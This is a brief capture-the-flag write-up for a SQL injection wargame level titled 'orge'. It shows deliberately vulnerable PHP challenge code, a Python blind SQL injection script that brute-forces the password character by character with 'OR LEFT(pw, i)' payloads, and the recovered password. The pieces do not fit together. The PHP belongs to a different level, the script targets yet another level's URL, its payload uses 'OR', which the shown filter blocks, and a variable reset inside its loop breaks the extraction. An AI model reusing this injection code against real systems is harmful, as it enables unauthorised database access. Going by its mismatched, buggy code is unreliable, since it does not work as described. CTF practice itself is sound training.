
#  ORGE

```
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
```
Length of the password is 8 by using length() function.
```
import requests
import string
characters = string.ascii_letters + string.digits
session = {
    "PHPSESSID": "dovaradinkdstego4urhvano2"
}
dbpass = ""
for i in range(1, 9):
    dbpass = ""
    for char in characters:
        paran = {
            "pw": f"OR LEFT(pw, {i}) = '{dbpass + char}' -- "
        }
        response = requests.get("https://los.rubiya.kr/chall/orc_60e5b360795c119588e4f3a86c5dd494.php", params=paran, cookies=session)
        output = response.text
        if "Hello admin" in output:
            dbpass += char
            break
print("Password:", dbpass)
```

###### Password:7b751aec
 ***
####   query : select id from prob_orge where id='guest' and pw='7b751aec'
***
